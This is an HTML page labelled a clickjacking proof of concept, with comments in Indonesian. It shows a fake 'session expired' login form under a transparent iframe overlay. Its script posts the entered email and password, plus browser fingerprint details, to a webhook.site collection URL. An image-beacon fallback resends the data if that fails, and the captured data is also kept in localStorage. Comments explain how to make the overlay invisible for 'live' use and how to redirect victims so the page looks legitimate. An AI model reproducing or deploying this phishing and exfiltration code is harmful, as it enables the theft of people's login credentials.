<!DOCTYPE html>
<html>
<head>
    <title>Login Required - Clickjacking PoC</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background: #f0f0f0;
        }
        .container {
            max-width: 400px;
            margin: 50px auto;
            background: white;
            padding: 20px;
            border: 2px solid #333;
        }
        h2 {
            margin-top: 0;
            color: #c00;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #999;
            box-sizing: border-box;
            font-size: 16px;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #c00;
            color: white;
            border: none;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin: 10px 0;
        }
        .debug {
            margin-top: 30px;
            padding: 15px;
            background: #ffd;
            border: 1px dashed #c00;
            font-family: monospace;
            font-size: 14px;
            word-break: break-all;
        }
        iframe {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: 2px solid red; /* Ubah ke opacity:0 untuk production */
            opacity: 0.3; /* 0.3 untuk testing biar keliatan, 0 untuk live */
            z-index: 9999;
            pointer-events: auto;
            background: transparent;
        }
        .warning {
            color: #c00;
            font-weight: bold;
            margin: 10px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>‚ö†Ô∏è SESSION EXPIRED</h2>
        <p>Your session has expired. Please login again to continue.</p>
        <div class="warning">* Login credentials will be sent to webhook.site</div>
        
        <form id="loginForm">
            <input type="email" id="email" name="email" placeholder="Email address" value="test@example.com" required>
            <input type="password" id="password" name="password" placeholder="Password" value="password123" required>
            <button type="button" id="submitBtn">LOGIN NOW</button>
        </form>
        
        <div class="debug" id="debug">
            Status: Waiting for click...
        </div>
    </div>

    <!-- Clickjacking iframe - transparan -->
    <iframe src="about:blank" id="clickjackFrame"></iframe>

    <script>
        // Fungsi untuk mengirim data ke webhook
        function sendToWebhook(email, password) {
            const debug = document.getElementById('debug');
            
            // Data yang akan dikirim
            const data = {
                timestamp: new Date().toISOString(),
                type: 'autofill_clickjacking_poc',
                email: email,
                password: password,
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenSize: screen.width + 'x' + screen.height,
                url: window.location.href,
                referrer: document.referrer || 'direct'
            };
            
            // Update debug
            debug.innerHTML = 'üì§ Sending data to webhook...<br>' + 
                             'Email: ' + email + '<br>' +
                             'Password: ' + password + '<br>' +
                             'URL: https://webhook.site/29f60501-ccf6-4f66-9ba8-fee857e1754c';
            
            // Kirim ke webhook
            fetch('https://webhook.site/29f60501-ccf6-4f66-9ba8-fee857e1754c', {
                method: 'POST',
                mode: 'no-cors', // Pakai no-cors biar gak kena CORS error
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data)
            })
            .then(() => {
                debug.innerHTML += '<br><br>‚úÖ Data sent successfully!<br>';
                debug.innerHTML += 'Check: <b>https://webhook.site/29f60501-ccf6-4f66-9ba8-fee857e1754c</b>';
            })
            .catch(error => {
                debug.innerHTML += '<br><br>‚ùå Error sending: ' + error;
                // Fallback - coba kirim pake cara lain
                fallbackSend(data);
            });
            
            // Simpan ke localStorage untuk bukti
            localStorage.setItem('captured_' + Date.now(), JSON.stringify(data));
        }
        
        // Fallback method pake image beacon
        function fallbackSend(data) {
            const img = new Image();
            img.src = 'https://webhook.site/29f60501-ccf6-4f66-9ba8-fee857e1754c?data=' + 
                      encodeURIComponent(JSON.stringify(data));
            document.getElementById('debug').innerHTML += '<br>üì° Fallback method used';
        }
        
        // Event listener untuk tombol
        document.getElementById('submitBtn').addEventListener('click', function() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            if (!email || !password) {
                alert('Email and password required');
                return;
            }
            
            sendToWebhook(email, password);
            
            // Opsional: redirect ke Google biar keliatan legitimate
            // setTimeout(() => {
            //     window.location.href = 'https://google.com';
            // }, 2000);
        });
        
        // Event listener untuk form submit (Enter key)
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            document.getElementById('submitBtn').click();
        });
        
        // Log di console
        console.log('=== CLICKJACKING PoC READY ===');
        console.log('Webhook: https://webhook.site/29f60501-ccf6-4f66-9ba8-fee857e1754c');
        console.log('Iframe opacity: 0.3 (visible for testing)');
        console.log('===============================');
        
        // Test webhook di background
        setTimeout(() => {
            console.log('Testing webhook connection...');
            fetch('https://webhook.site/29f60501-ccf6-4f66-9ba8-fee857e1754c', {
                method: 'POST',
                mode: 'no-cors',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({test: true, message: 'PoC loaded'})
            });
        }, 1000);
    </script>
</body>
</html>
